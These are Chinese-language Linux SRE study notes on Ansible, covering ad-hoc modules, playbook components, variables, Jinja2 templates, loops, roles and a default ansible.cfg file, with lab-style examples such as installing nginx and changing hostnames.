#16.Replace模块
该模块有点类似于sed命令，主要也是基于正则进行匹配和替换，建议使用


[18:12:43 root@ansible ~]# ansible all -m replace -a "path=/etc/fstab regexp='^(UUID.*)' replace='#\1'"  
[18:12:43 root@ansible ~]# ansible all -m replace -a "path=/etc/fstab regexp='^#(UUID.*)' replace='\1'"



#17.SELinux模块
功能：该模块管理SELinux策略

#禁用SELinux
[09:13:52 root@ansible ~]#ansible all -m selinux -a 'state=disabled'


#18.reboot模块
[09:13:52 root@ansible ~]# ansible all -m reboot


19.Setup模块
功能： setup 模块来收集主机的系统信息，这些facts信息可以直接以变量的形式使用，但是如果主机较多，会影响执行速度，可以使用 gather_facts:no来禁止 Ansible 收集facts信息

ansible all -m setup
ansible all -m setup -a "filter=ansible_nodename"
ansible all -m setup -a "filter=ansible_hostname"
ansible all -m setup -a "filter=ansible_domain"
ansible all -m setup -a "filter=ansible_memtotal_mb" #内存总大小
ansible all -m setup -a "filter=ansible_memory_mb"
ansible all -m setup -a "filter=ansible_memfree_mb"
ansible all -m setup -a "filter=ansible_os_family" #ubuntu 
ansible all -m setup -a "filter=ansible_distribution_major_version" #操作系统版本
ansible all -m setup -a "filter=ansible_distribution_version"
ansible all -m setup -a "filter=ansible_processor_vcpus"
ansible all -m setup -a "filter=ansible_all_ipv4_addresses"
ansible all -m setup -a "filter=ansible_architecture"
ansible all -m setup -a "filter=ansible_processor
```

#### 31.2.5Playbook的使用

![1654134342594](linuxSRE.assets/1654134342594.png)

##### 31.2.5.1Playbook核心组件

```
#0.一个playbook 中由列表组成,其中所用到的常见组件类型如下
Hosts 执行的远程主机列表
Tasks 任务集,由多个task的元素组成的列表实现,每个task是一个字典,一个完整的代码块功能需最少元素需包括 name 和 task,一个name只能包括一个task
Variables 内置变量或自定义变量在playbook中调用
Templates 模板，可替换模板文件中的变量并实现一些简单逻辑的文件
Handlers 和 notify 结合使用，由特定条件触发的操作，满足条件方才执行，否则不执行
tags 标签 指定某条任务执行，用于选择运行playbook中的部分代码。ansible具有幂等性，因此会自动跳过没有变化的部分，即便如此，有些代码为测试其确实没有发生变化的时间依然会非常地长。此时，如果确信其没有变化，就可以通过tags跳过此些代码片断



#1.hosts组件
Hosts：playbook中的每一个play的目的都是为了让特定主机以某个指定的用户身份执行任务。hosts用于指定要执行指定任务的主机，须事先定义在主机清单中

one.example.com
one.example.com:two.example.com
192.168.1.50
192.168.1.*
Websrvs:dbsrvs     #或者，两个组的并集
Websrvs:&dbsrvs   #与，两个组的交集
webservers:!dbsrvs  #在websrvs组，但不在dbsrvs组
案例：
- hosts: websrvs:appsrvs



#2.remote_user组件
remote_user: 可用于Host和task中。也可以通过指定其通过sudo的方式在远程主机上执行任务，其可用于play全局或某任务；此外，甚至可以在sudo时使用sudo_user指定sudo时切换的用户

- hosts: websrvs
 remote_user: root
  
 tasks:
   - name: test connection
     ping:
     remote_user: magedu
     sudo: yes #默认sudo为root
     sudo_user:wang    #sudo为wang
     


#3.task列表和action组件
play的主体部分是task list，task list中有一个或多个task,各个task 按次序逐个在hosts中指定的所有主机上执行，即在所有主机上完成第一个task后，再开始第二个task
task的目的是使用指定的参数执行模块，而在模块参数中可以使用变量。模块执行是幂等的，这意味着多次执行是安全的，因为其结果均一致
每个task都应该有其name，用于playbook的执行结果输出，建议其内容能清晰地描述任务执行步骤。如果未提供name，则action的结果将用于输出
- hosts: websrvs
  remote_user: root
  gather_facts: no

  tasks:
    - name: test connection
      ping:
    - name: wall
      shell: wall hello

- hosts: dbsrvs
  gather_facts: no
  tasks:
    - name: install httpd
      yum: name=httpd
    - name: start service
      service:
        name: httpd
        state: started
        enabled: yes
[11:12:52 root@ansible ~]# ansible-playbook --syntax-check hello.yml #检查语法格式

playbook: hello.ym
[11:12:52 root@ansible ~]# ansible-playbook -C  hello.yml #假运行，不改变文件格式
[11:12:52 root@ansible ~]# ansible-playbook hello.yml #真运行



#4.忽略错误 ignore_errors
功能：如果一个task出错，默认将不会继续执行其他的task，利用ignore_errors:yes,可以忽略task错误，继续向下执行playbook其他task

案例：
- hosts: websrvs

  tasks:
    - name: error
      command: /bin/false
      ignore_errors: yes #忽略错误
    - name: continue
      command: wall continue



#5.Playbook中使用handlers和notify
Handlers本质是task list ，类似于MySQL中的触发器触发的行为，其中的task与前述的task并没有本质上的不同，主要用于当关注的资源发生变化时，才会采取一定的操作。而Notify对应的action可用于在每个play的最后被触发，这样可避免多次有改变发生时每次都执行指定的操作，仅在所有的变化发生完成后一次性地执行指定操作。在notify中列出的操作称为handler，也即notify中调handler中定义的操作

只要文件有改动，就会把原先的覆盖并重新启动nginx服务
- hosts: websrvs
  remote_user: root
  gather_facts: no
  force_handlers: yes #强行触发handlers
  
  tasks:
    - name: add group nginx
      group: name=nginx state=present
    - name: add user nginx
      user: name=nginx state=present group=nginx
    - name: Install Nginx
      yum: name=nginx state=present
    - name: Config file
      copy: src=files/nginx.conf dest=/etc/nginx/nginx.conf
      notify: restart nginx service #文件改动则触发handlers
    - name: web page
      copy: src=files/index.html dest=/usr/share/nginx/html/index.html
    - name: Start Nginx
      service: name=nginx state=started enabled=yes

  handlers: #被动触发
    - name: restart nginx service
      service: name=nginx state=restarted




#6.Playbook中使用tags组件
在playbook文件中，可以利用tags组件，为特定 task 指定标签，当在执行playbook时，可以只执行特定tags的task,而非整个playbook文件(指定标签任务执行)

- hosts: websrvs
  remote_user: root
  gather_facts: no
  force_handlers: yes 

  tasks:
    - name: add group nginx
      group: name=nginx state=present
    - name: add user nginx
      user: name=nginx state=present group=nginx
    - name: Install Nginx
      yum: name=nginx state=present
    - name: Config file
      copy: src=files/nginx.conf dest=/etc/nginx/nginx.conf
      notify: restart nginx service
      tags: conf  #标签
    - name: web page
      copy: src=files/index.html dest=/usr/share/nginx/html/index.html
      tags: data #标签
    - name: Start Nginx
      service: name=nginx state=started enabled=yes

  handlers:
    - name: restart nginx service
      service: name=nginx state=restarted 
[22:10:13 root@ansible ansible]#ansible-playbook --list-tags install_nginx.yml 

playbook: install_nginx.yml
#查看标签列表
  play #1 (websrvs): websrvs	TAGS: []
      TASK TAGS: [conf, data]

[22:14:17 root@ansible ansible]#ansible-playbook -t conf install_nginx.yml  #指定标签运行




#7.playboo相关命令
--syntax-check      #语法检查
-C --check #只检测可能会发生的改变，但不真正执行操作
--list-hosts    #列出运行任务的主机
--list-tags #列出tag
--list-tasks #列出task
--limit 主机列表 #只针对主机列表中的特定主机执行
-v -vv  -vvv #显示过程
 -i hosts #指定主机清单
```

##### 31.2.5.2Playbook初步

```
#1.利用playbook创建mysql用户
范例：mysql_user.yml
- hosts: dbsrvs
  remote_user: root
  gather_facts: no

  tasks:
    - {name: create group, group: name=mysql system=yes gid=306}
    - name: create user
      user: name=mysql shell=/sbin/nologin system=yes group=mysql uid=306 home=/data/mysql create_home=no
      
 
 
 
#2.利用playbook安装nginx
[13:16:32 root@ansible ansible]#ansible all -m yum -a 'name=httpd state=absent' #要先卸载httpd服务，不然冲突

- hosts: websrvs
  remote_user: root
  gather_facts: no

  tasks:
    - name: add group nginx
      group: name=nginx state=present
    - name: add user nginx
      user: name=nginx state=present group=nginx
    - name: Install Nginx
      yum: name=nginx state=present
    - name: Config file
      copy: src=files/nginx.conf dest=/etc/nginx/nginx.conf
    - name: web page
      copy: src=files/index.html dest=/usr/share/nginx/html/index.html
    - name: Start Nginx
      service: name=nginx state=started enabled=yes
      


#3.利用playbook卸载nginx

- hosts: websrvs
  remote_user: root
  gather_facts: no

  tasks:
    - name: Stop Nginx
      service: name=nginx state=stopped enabled=no
    - name: Remove Nginx
      yum: name=nginx state=absent
    - name: remove user nginx
      user: name=nginx state=absent
    - name: remove group nginx
      group: name=nginx state=absent
    - name: Config file
      file: path=files/nginx.conf state=absent
    - name: web page
      file: path=/usr/share/nginx/html/index.html state=absent
      
      
      
#4.批量修改主机名

- hosts: websrvs
  vars:
    host: web 
    domain: liusenbiao.org

  tasks:
    - name: get variable
      shell: echo $RANDOM | md5sum | cut -c 1-8 
      register: get_random
    - name: print variable
      debug:
        msg: "{{get_random.stdout}}"
    - name: set hostname
      hostname: name={{host}}-{{get_random.stdout}}.{{domain}}

执行结果：
ok: [10.0.0.17] => {
    "msg": "250e4297"
}
ok: [10.0.0.18] => {
    "msg": "967ac074"
}
[root@pxc2 ~]# hostname
web-250e4297.liusenbiao.org
root@slave1:~# hostname
web-967ac074.liusenbiao.org



#5.批量修改密码
- hosts: websrvs
  gather_facts: false

  tasks:
    - name: change user passwd
      user: name={{item.name}} password={{item.chpass | password_hash('sha512')}} update_password=always
      with_items:
           - {name: 'root',chpass: '123456'}
           - {name: 'liu',chpass: '654321'}
```

**利用playbook安装mysql5.6**

![1654223991260](linuxSRE.assets/1654223991260.png)

##### 31.2.5.3Playbook的变量使用

```
#1.针对当前项目的主机和主机组的变量

生产建议在项目目录中创建额外的两个变量目录，分别是hostvars和groupvars
hostvars下面的文件名和主机清单主机名一致，针对单个主机进行变量定义格式:hostvars/hostname
groupvars下面的文件名和主机清单中组名一致针对单个组进行变量定义格式:gorupvars/groupname
group_vars/all文件内定义的变量对所有组都有效


范例:特定项目的主机和组变量
[11:14:33 root@ansible ansible]# mkdir host_vars
[11:15:09 root@ansible ansible]# mkdir group_vars[11:15:19 root@ansible ansible]#vim host_vars/10.0.0.18
id: 2
[11:23:14 root@ansible ansible]#vim host_vars/10.0.0.17
id: 1
[11:25:15 root@ansible ansible]#vim group_vars/websrvs
name: web
[11:25:53 root@ansible ansible]#vim group_vars/all
domain: liusenbiao.org

[11:28:33 root@ansible ansible]#tree host_vars/ group_vars/
host_vars/
├── 10.0.0.17
└── 10.0.0.18
group_vars/
├── all
└── websrvs
[11:28:42 root@ansible ansible]#vim var8.yml
- hosts: websrvs

  tasks:
    - name: get variable
      command: echo "{{name}}{{id}}.{{domain}}"
      register: result #把上面的命令的执行结果传递到result里面
    - name: print variable
      debug:
        msg: "{{result.stdout}}"
执行结果：
ok: [10.0.0.17] => {
    "msg": "web1.liusenbiao.org"
}
ok: [10.0.0.18] => {
    "msg": "web2.liusenbiao.org"
}     

变量的优先级从高到低如下：
-e 选项定义变量-->playbook中vars_files->playbook中vars变量定义 -->host_vars/主机名文件-->主机清单中主机变量-->group_vars/主机组名文件-->group_vars/all文件--> 主机清单组变量




#2.register注册变量
功能：在playbook中可以使用register将捕获命令的输出保存到临时变量中，然后使用debug模块进行显示输出

[11:56:04 root@ansible ansible]#vim register.yml
- hosts: websrvs

  tasks:
    - name: get variable
      shell: hostname
      register: name
    - name: print variable
      debug:
        msg: "{{name.stdout}}"
        
执行结果：
ok: [10.0.0.17] => {
    "msg": "pxc2"
}
ok: [10.0.0.18] => {
    "msg": "slave1.liusenbiao.org"
}
```

#### 31.2.6 template模板

##### 31.2.6.1jinja2语言

```
#0.template功能：可以根据和参考模块文件，动态生成相类似的配置文件
template文件必须存放于templates目录下，且命名为 .j2 结尾
yaml/yml 文件需和templates目录平级，目录结构如下示例：
 ./
 ├── temnginx.yml
 └── templates
 └── nginx.conf.j2
 
 
 #范例：
 #利用template同步nginx配置文件中依据cpu核数来开启进程数
[12:11:05 root@ansible ansible]#vim register2.yml 
[12:12:13 root@ansible ansible]#mkdir templates
[16:49:40 root@ansible ansible]#cp files/nginx.conf templates/nginx.conf.j2
[16:50:05 root@ansible ansible]#vim templates/nginx.conf.j2
#第六行
worker_processes {{ansible_processor_vcpus+2}};
[16:55:42 root@ansible ansible]#vim install_nginx.yml
- hosts: websrvs
  remote_user: root
  gather_facts: yes
  force_handlers: yes 

  tasks:
    - name: add group nginx
      group: name=nginx state=present
    - name: add user nginx
      user: name=nginx state=present group=nginx
    - name: Install Nginx
      yum: name=nginx state=present
    - name: Config file
      #copy: src=files/nginx.conf dest=/etc/nginx/nginx.conf
      template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf
      notify: restart nginx service #模板模块
      tags: conf
    - name: web page
      copy: src=files/index.html dest=/usr/share/nginx/html/index.html
      tags: data
    - name: Start Nginx
      service: name=nginx state=started enabled=yes

  handlers:
    - name: restart nginx service
      service: name=nginx state=restarted
[17:10:17 root@ansible ansible]#ansible-playbook install_nginx.yml





#1.template中使用流程控制for和if
#templnginx5.yml
- hosts: websrvs
 remote_user: root
 vars:
   nginx_vhosts:
     - web1:
       listen: 8080
       root: "/var/www/nginx/web1/"
     - web2:
       listen: 8080
       server_name: "web2.magedu.com"
       root: "/var/www/nginx/web2/"
     - web3:
       listen: 8080
       server_name: "web3.magedu.com"
       root: "/var/www/nginx/web3/"
 tasks:
   - name: template config to 
     template: src=nginx.conf5.j2 dest=/data/nginx5.conf
          
          
#templates/nginx.conf5.j2
{% for vhost in nginx_vhosts %}
server {
   listen {{ vhost.listen }}
   {% if vhost.server_name is defined %}
server_name {{ vhost.server_name }}   #注意缩进
   {% endif %}
root  {{ vhost.root }}  #注意缩进
}
{% endfor %} 

#生成的结果
server {
   listen 8080
   root /var/www/nginx/web1/
}
server {
   listen 8080
   server_name web2.magedu.com
   root /var/www/nginx/web2/
}
server {
   listen 8080
   server_name web3.magedu.com
   root /var/www/nginx/web3/
}



#2.playbook使用迭代with_items(loop)
迭代：当有需要重复性执行的任务时，可以使用迭代机制
对迭代项的引用，固定内置变量名为"item"
要在task中使用with_items给定要迭代的元素列表
注意: ansible2.5版本后,可以用loop代替with_items


#2.1批量创建账号
- hosts: websrvs
  remote_user: root

  tasks:
    - name: add serveral users
      user: name={{item}} state=present groups=wheel
      with_items:
        - liu1
        - liu2
        - liu3
执行结果：
changed: [10.0.0.17] => (item=liu1)
changed: [10.0.0.17] => (item=liu2)
changed: [10.0.0.18] => (item=liu1)
changed: [10.0.0.17] => (item=liu3)
changed: [10.0.0.18] => (item=liu2)
changed: [10.0.0.18] => (item=liu3)



#2.2卸载 mariadb
#remove mariadb server
- hosts: appsrvs:!10.0.0.8
 remote_user: root
 tasks:
    - name: stop service
     shell: /etc/init.d/mysqld stop
    - name: delete files and dir
     file: path={{item}} state=absent
     with_items:
        - /usr/local/mysql
        - /usr/local/mariadb-10.2.27-linux-x86_64
        - /etc/init.d/mysqld
        - /etc/profile.d/mysql.sh
        - /etc/my.cnf
        - /data/mysql
    - name: delete user
     user: name=mysql state=absent remove=yes
     

#2.3迭代嵌套子变量：在迭代中，还可以嵌套子变量，关联多个变量在一起使用
- hosts: websrvs
  remote_user: root
  
 tasks:
   - name: add some groups
     group: name={{ item }} state=present
     with_items:
       - nginx
       - mysql
       - apache
   - name: add some users
     user: name={{ item.name }} group={{ item.group }} state=present
     with_items:
       - { name: 'nginx', group: 'nginx' }
       - { name: 'mysql', group: 'mysql' }
       - { name: 'apache', group: 'apache' }
       
       
 
 
#3.分组block
功能：当满足一个条件下，执行多个任务时，就需要分组了，而不是每个任务都用when

- hosts: websrvs
  remote_user: root
  
 tasks:
   - block:
       - debug: msg="first"
       - debug: msg="first"
     when:
       - ansible_facts['distribution'] == "CentOS"
       - ansible_facts['distribution_major_version'] == "8"
       
       

#4.changed_when
changed_when检查task返回结果，决定是否继续向下执行
- hosts: websrvs
  remote_user: root
  
  tasks:
    - name: install nginx
      yum: name=nginx
    -name: config file
     template: src="nginx.conf.j2" dest="/etc/nginx/nginx.conf"
     notify: restart nginx
    - name: check config
      shell: /usr/sbin/nginx -t
      register: check_nginx_config
      changed_when:
        - (check_nginx_config.stdout.find('successful')) #如果执行结果有successful的字符串，则继续执行，如果没有则停止向下执行
        - false
     - name : start service
       service: name=nginx state=started enabled=yes
   handlers:
     - name: restart nginx
       service: name=nginx state=restarted
       
       
   
   
#5.滚动执行
管理节点过多导致的超时问题解决方法
默认情况下，Ansible将尝试并行管理playbook中所有的机器。对于滚动更新用例，可以使用serial关键字定义Ansible一次应管理多少主机，还可以将serial关键字指定为百分比，表示每次并行执行的主机数占总数的比例
#5.1范例：

#vim test_serial.yml
---
- hosts: all
 serial: 2  #每次只同时处理2个主机,将所有task执行完成后,再选下2个主机再执行所有task,直至所有主机

 gather_facts: False
 tasks:
   - name: task one
 comand: hostname
   - name: task two
     command: hostname
     

#5.2范例：
- name: test serail
 hosts: all
 serial: "20%"   #每次只同时处理20%的主机
 
 
 
#6.委派到其他主机执行
功能：本机不执行，把任务委派到其他之际执行
command: hostname -I
delegate_to: 10.0.0.8




#6.yaml文件的相互调用

#6.1include: b.yml #调用另一个yml文件

#6.2也可以将多个包含完整内容的yml文件由一个yml统一调用
[16:19:30 root@ansible ~]# cat total_tasks.yml
-import_playbook: tasks1.yml
-import_playbook: tasks2.yml
[16:19:30 root@ansible ~]# cat tasks1.yml
- hosts: websrvs
  remote_user: root
  
  tasks:
    - name: run tasks1 job
      command: wall run tasks1 job
[16:19:30 root@ansible ~]# cat tasks2.yml      
- hosts: websrvs
  remote_user: root
  
  tasks:
    - name: run tasks2 job
      command: wall run tasks2 job
```

#### 31.2.7企业级roles角色

roles能够根据层次型结构自动装载变量文件、tasks以及handlers等。要使用roles只需要在playbook中使用include指令即可。简单来讲，roles就是通过分别将变量、文件、任务、模板及处理器放置于单独的目录中，并可以便捷地include它们的一种机制。角色一般用于基于主机构建服务的场景中，但也可以是用于构建守护进程等场景中

![1654331660992](linuxSRE.assets/1654331660992.png)

##### 31.2.7.1用role多台主机部署Nginx

**ansible.cfg:**

```
# config file for ansible -- https://ansible.com/
# ===============================================

# nearly all parameters can be overridden in ansible-playbook
# or with command line flags. ansible will read ANSIBLE_CONFIG,
# ansible.cfg in the current working directory, .ansible.cfg in
# the home directory or /etc/ansible/ansible.cfg, whichever it
# finds first

[defaults]

# some basic default values...

inventory       = ./hosts
#library        = /usr/share/my_modules/
#module_utils   = /usr/share/my_module_utils/
#remote_tmp     = ~/.ansible/tmp
#local_tmp      = ~/.ansible/tmp
#plugin_filters_cfg = /etc/ansible/plugin_filters.yml
#forks          = 5
#poll_interval  = 15
#sudo_user      = root
#ask_sudo_pass = True
#ask_pass      = True
#transport      = smart
#remote_port    = 22
#module_lang    = C
#module_set_locale = False

# plays will gather facts by default, which contain information about
# the remote system.
#
# smart - gather by default, but don't regather if already gathered
# implicit - gather by default, turn off with gather_facts: False
# explicit - do not gather by default, must say gather_facts: True
#gathering = implicit

# This only affects the gathering done by a play's gather_facts directive,
# by default gathering retrieves all facts subsets
# all - gather all subsets
# network - gather min and network facts
# hardware - gather hardware facts (longest facts to retrieve)
# virtual - gather min and virtual facts
# facter - import facts from facter
# ohai - import facts from ohai
# You can combine them using comma (ex: network,virtual)
# You can negate them using ! (ex: !hardware,!facter,!ohai)
# A minimal set of facts is always gathered.
#gather_subset = all

# some hardware related facts are collected
# with a maximum timeout of 10 seconds. This
# option lets you increase or decrease that
# timeout to something more suitable for the
# environment.
# gather_timeout = 10

# Ansible facts are available inside the ansible_facts.* dictionary
# namespace. This setting maintains the behaviour which was the default prior
# to 2.5, duplicating these variables into the main namespace, each with a
# prefix of 'ansible_'.
# This variable is set to True by default for backwards compatibility. It
# will be changed to a default of 'False' in a future release.
# ansible_facts.
# inject_facts_as_vars = True

# additional paths to search for roles in, colon separated
#roles_path    = /etc/ansible/roles

# uncomment this to disable SSH key host checking
host_key_checking = False

# change the default callback, you can only have one 'stdout' type  enabled at a time.
#stdout_callback = skippy


## Ansible ships with some plugins that require whitelisting,
## this is done to avoid running all of a type by default.
## These setting lists those that you want enabled for your system.
## Custom plugins should not need this unless plugin author specifies it.

# enable callback plugins, they can output to stdout but cannot be 'stdout' type.
#callback_whitelist = timer, mail

# Determine whether includes in tasks and handlers are "static" by
# default. As of 2.0, includes are dynamic by default. Setting these
# values to True will make includes behave more like they did in the
# 1.x versions.
#task_includes_static = False
#handler_includes_static = False

# Controls if a missing handler for a notification event is an error or a warning
#error_on_missing_handler = True

# change this for alternative sudo implementations
#sudo_exe = sudo

# What flags to pass to sudo
# WARNING: leaving out the defaults might create unexpected behaviours
#sudo_flags = -H -S -n

# SSH timeout
#timeout = 10

# default user to use for playbooks if user is not specified
# (/usr/bin/ansible will use current user as default)
#remote_user = root

# logging is off by default unless this path is defined
# if so defined, consider logrotate
#log_path = /var/log/ansible.log

# default module name for /usr/bin/ansible
#module_name = command

# use this shell for commands executed under sudo
# you may need to change this to bin/bash in rare instances
# if sudo is constrained
#executable = /bin/sh

# if inventory variables overlap, does the higher precedence one win
# or are hash values merged together?  The default is 'replace' but
# this can also be set to 'merge'.
#hash_behaviour = replace

# by default, variables from roles will be visible in the global variable
# scope. To prevent this, the following option can be enabled, and only
# tasks and handlers within the role will see the variables there
#private_role_vars = yes

# list any Jinja2 extensions to enable here:
#jinja2_extensions = jinja2.ext.do,jinja2.ext.i18n

# if set, always use this private key file for authentication, same as
# if passing --private-key to ansible or ansible-playbook
#private_key_file = /path/to/file

# If set, configures the path to the Vault password file as an alternative to
# specifying --vault-password-file on the command line.
#vault_password_file = /path/to/vault_password_file

# format of string {{ ansible_managed }} available within Jinja2
# templates indicates to users editing templates files will be replaced.
# replacing {file}, {host} and {uid} and strftime codes with proper values.
#ansible_managed = Ansible managed: {file} modified on %Y-%m-%d %H:%M:%S by {uid} on {host}
# {file}, {host}, {uid}, and the timestamp can all interfere with idempotence
# in some situations so the default is a static string:
#ansible_managed = Ansible managed

# by default, ansible-playbook will display "Skipping [host]" if it determines a task
# should not be run on a host.  Set this to "False" if you don't want to see these "Skipping"
# messages. NOTE: the task header will still be shown regardless of whether or not the
# task is skipped.
#display_skipped_hosts = True

# by default, if a task in a playbook does not include a name: field then
# ansible-playbook will construct a header that includes the task's action but
# not the task's args.  This is a security feature because ansible cannot know
# if the *module* considers an argument to be no_log at the time that the
# header is printed.  If your environment doesn't have a problem securing
# stdout from ansible-playbook (or you have manually specified no_log in your
# playbook on all of the tasks where you have secret information) then you can
# safely set this to True to get more informative messages.
#display_args_to_stdout = False

# by default (as of 1.3), Ansible will raise errors when attempting to dereference
# Jinja2 variables that are not set in templates or action lines. Uncomment this line
# to revert the behavior to pre-1.3.
#error_on_undefined_vars = False

# by default (as of 1.6), Ansible may display warnings based on the configuration of the
# system running ansible itself. This may include warnings about 3rd party packages or
# other conditions that should be resolved if possible.
# to disable these warnings, set the following value to False:
#system_warnings = True

# by default (as of 1.4), Ansible may display deprecation warnings for language
# features that should no longer be used and will be removed in future versions.
# to disable these warnings, set the following value to False:
#deprecation_warnings = True

# (as of 1.8), Ansible can optionally warn when usage of the shell and
# command module appear to be simplified by using a default Ansible module
# instead.  These warnings can be silenced by adjusting the following
# setting or adding warn=yes or warn=no to the end of the command line
# parameter string.  This will for example suggest using the git module
# instead of shelling out to the git command.
# command_warnings = False


# set plugin path directories here, separate with colons
#action_plugins     = /usr/share/ansible/plugins/action
#become_plugins     = /usr/share/ansible/plugins/become
#cache_plugins      = /usr/share/ansible/plugins/cache
#callback_plugins   = /usr/share/ansible/plugins/callback
#connection_plugins = /usr/share/ansible/plugins/connection
#lookup_plugins     = /usr/share/ansible/plugins/lookup
#inventory_plugins  = /usr/share/ansible/plugins/inventory
#vars_plugins       = /usr/share/ansible/plugins/vars
#filter_plugins     = /usr/share/ansible/plugins/filter
#test_plugins       = /usr/share/ansible/plugins/test
#terminal_plugins   = /usr/share/ansible/plugins/terminal
#strategy_plugins   = /usr/share/ansible/plugins/strategy


# by default, ansible will use the 'linear' strategy but you may want to try
# another one
#strategy = free

# by default callbacks are not loaded for /bin/ansible, enable this if you
# want, for example, a notification or logging callback to also apply to
# /bin/ansible runs
#bin_ansible_callbacks = False


# don't like cows?  that's unfortunate.
# set to 1 if you don't want cowsay support or export ANSIBLE_NOCOWS=1
#nocows = 1

# set which cowsay stencil you'd like to use by default. When set to 'random',
# a random stencil will be selected for each task. The selection will be filtered
# against the `cow_whitelist` option below.
#cow_selection = default
#cow_selection = random

# when using the 'random' option for cowsay, stencils will be restricted to this list.
# it should be formatted as a comma-separated list with no spaces between names.
# NOTE: line continuations here are for formatting purposes only, as the INI parser
#       in python does not support them.
#cow_whitelist=bud-frogs,bunny,cheese,daemon,default,dragon,elephant-in-snake,elephant,eyes,\
#              hellokitty,kitty,luke-koala,meow,milk,moofasa,moose,ren,sheep,small,stegosaurus,\
#              stimpy,supermilker,three-eyes,turkey,turtle,tux,udder,vader-koala,vader,www

# don't like colors either?
# set to 1 if you don't want colors, or export ANSIBLE_NOCOLOR=1
#nocolor = 1

# if set to a persistent type (not 'memory', for example 'redis') fact values
# from previous runs in Ansible will be stored.  This may be useful when
# wanting to use, for example, IP information from one group of servers
# without having to talk to them in the same playbook run to get their
# current IP information.
#fact_caching = memory

#This option tells Ansible where to cache facts. The value is plugin dependent.
#For the jsonfile plugin, it should be a path to a local directory.
#For the redis plugin, the value is a host:port:database triplet: fact_caching_connection = localhost:6379:0

#fact_caching_connection=/tmp



# retry files
# When a playbook fails a .retry file can be created that will be placed in ~/
# You can enable this feature by setting retry_files_enabled to True
# and you can change the location of the files by setting retry_files_save_path

#retry_files_enabled = False
#retry_files_save_path = ~/.ansible-retry

# squash actions
# Ansible can optimise actions that call modules with list parameters
# when looping. Instead of calling the module once per with_ item, the
# module is called once with all items at once. Currently this only works
# under limited circumstances, and only with parameters named 'name'.
#squash_actions = apk,apt,dnf,homebrew,pacman,pkgng,yum,zypper

# prevents logging of task data, off by default
#no_log = False

# prevents logging of tasks, but only on the targets, data is still logged on the master/controller
#no_target_syslog = False

# controls whether Ansible will raise an error or warning if a task has no
# choice but to create world readable temporary files to execute a module on
# the remote machine.  This option is False by default for security.  Users may
# turn this on to have behaviour more like Ansible prior to 2.1.x.  See
# https://docs.ansible.com/ansible/become.html#becoming-an-unprivileged-user
# for more secure ways to fix this than enabling this option.
#allow_world_readable_tmpfiles = False

# controls the compression level of variables sent to
# worker processes. At the default of 0, no compression
# is used. This value must be an integer from 0 to 9.
#var_compression_level = 9

# controls what compression method is used for new-style ansible modules when
# they are sent to the remote system.  The compression types depend on having
# support compiled into both the controller's python and the client's python.
# The names should match with the python Zipfile compression types:
# * ZIP_STORED (no compression. available everywhere)
# * ZIP_DEFLATED (uses zlib, the default)
# These values may be set per host via the ansible_module_compression inventory
# variable
#module_compression = 'ZIP_DEFLATED'

# This controls the cutoff point (in bytes) on --diff for files
# set to 0 for unlimited (RAM may suffer!).
#max_diff_size = 1048576

# This controls how ansible handles multiple --tags and --skip-tags arguments
# on the CLI.  If this is True then multiple arguments are merged together.  If
# it is False, then the last specified argument is used and the others are ignored.
# This option will be removed in 2.8.
#merge_multiple_cli_flags = True

# Controls showing custom stats at the end, off by default
#show_custom_stats = True

# Controls which files to ignore when using a directory as inventory with
# possibly multiple sources (both static and dynamic)
#inventory_ignore_extensions = ~, .orig, .bak, .ini, .cfg, .retry, .pyc, .pyo

# This family of modules use an alternative execution path optimized for network appliances
# only update this setting if you know how this works, otherwise it can break module execution
#network_group_modules=eos, nxos, ios, iosxr, junos, vyos

# When enabled, this option allows lookups (via variables like {{lookup('foo')}} or when used as
# a loop with `with_foo`) to return data that is not marked "unsafe". This means the data may contain
# jinja2 templating language which will be run through the templating engine.
# ENABLING THIS COULD BE A SECURITY RISK
#allow_unsafe_lookups = False

# set default errors for all plays
#any_errors_fatal = False

[inventory]
# enable inventory plugins, default: 'host_list', 'script', 'auto', 'yaml', 'ini', 'toml'
#enable_plugins = host_list, virtualbox, yaml, constructed

# ignore these extensions when parsing a directory as inventory source
#ignore_extensions = .pyc, .pyo, .swp, .bak, ~, .rpm, .md, .txt, ~, .orig, .ini, .cfg, .retry

# ignore files matching these patterns when parsing a directory as inventory source
#ignore_patterns=

# If 'true' unparsed inventory sources become fatal errors, they are warnings otherwise.
#unparsed_is_failed=False

[privilege_escalation]
#become=True
#become_method=sudo
#become_user=root
#become_ask_pass=False

[paramiko_connection]

# uncomment this line to cause the paramiko connection plugin to not record new host
# keys encountered.  Increases performance on new host additions.  Setting works independently of the
# host key checking setting above.
#record_host_keys=False

# by default, Ansible requests a pseudo-terminal for commands executed under sudo. Uncomment this
# line to disable this behaviour.
#pty=False

# paramiko will default to looking for SSH keys initially when trying to
# authenticate to remote devices.  This is a problem for some network devices
# that close the connection after a key failure.  Uncomment this line to
# disable the Paramiko look for keys function
#look_for_keys = False

# When using persistent connections with Paramiko, the connection runs in a
# background process.  If the host doesn't already have a valid SSH key, by
# default Ansible will prompt to add the host key.  This will cause connections
# running in background processes to fail.  Uncomment this line to have
# Paramiko automatically add host keys.
#host_key_auto_add = True

[ssh_connection]

# ssh arguments to use
# Leaving off ControlPersist will result in poor performance, so use
# paramiko on older platforms rather than removing it, -C controls compression use
#ssh_args = -C -o ControlMaster=auto -o ControlPersist=60s

# The base directory for the ControlPath sockets.
# This is the "%(directory)s" in the control_path option
#
# Example:
# control_path_dir = /tmp/.ansible/cp
#control_path_dir = ~/.ansible/cp

# The path to use for the ControlPath sockets. This defaults to a hashed string of the hostname,
# port and username (empty string in the config). The hash mitigates a common problem users
# found with long hostnames and the conventional %(directory)s/ansible-ssh-%%h-%%p-%%r format.
# In those cases, a "too long for Unix domain socket" ssh error would occur.
#
# Example:
# control_path = %(directory)s/%%h-%%r
#control_path =

# Enabling pipelining reduces the number of SSH operations required to
# execute a module on the remote server. This can result in a significant
# performance improvement when enabled, however when using "sudo:" you must
# first disable 'requiretty' in /etc/sudoers
#
# By default, this option is disabled to preserve compatibility with
# sudoers configurations that have requiretty (the default on many distros).
#
#pipelining = False

# Control the mechanism for transferring files (old)
#   * smart = try sftp and then try scp [default]
#   * True = use scp only
#   * False = use sftp only
#scp_if_ssh = smart

# Control the mechanism for transferring files (new)
# If set, this will override the scp_if_ssh option
#   * sftp  = use sftp to transfer files
#   * scp   = use scp to transfer files
#   * piped = use 'dd' over SSH to transfer files
#   * smart = try sftp, scp, and piped, in that order [default]
#transfer_method = smart

